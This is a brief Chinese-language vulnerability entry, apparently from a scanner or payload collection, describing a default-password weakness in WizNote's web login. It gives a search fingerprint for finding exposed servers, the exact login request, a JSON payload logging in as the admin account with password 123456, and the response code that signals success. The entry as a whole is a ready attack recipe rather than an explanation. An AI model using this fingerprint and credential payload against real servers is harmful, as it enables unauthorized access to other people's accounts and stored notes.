# 为知笔记login存在弱口令漏洞

为知笔记 ｜ 默认口令 ｜ —
- **指纹**：`title="WizNote"`
- **请求**：`POST /as/user/login?clientType=web&clientVersion=4.0&lang=zh-cn HTTP/1.1`

**Payload**
```
{"userId":"admin@wiz.cn","password":"123456","autoLogin":true,"domain":"","deviceId":null}
```
- **响应特征**：200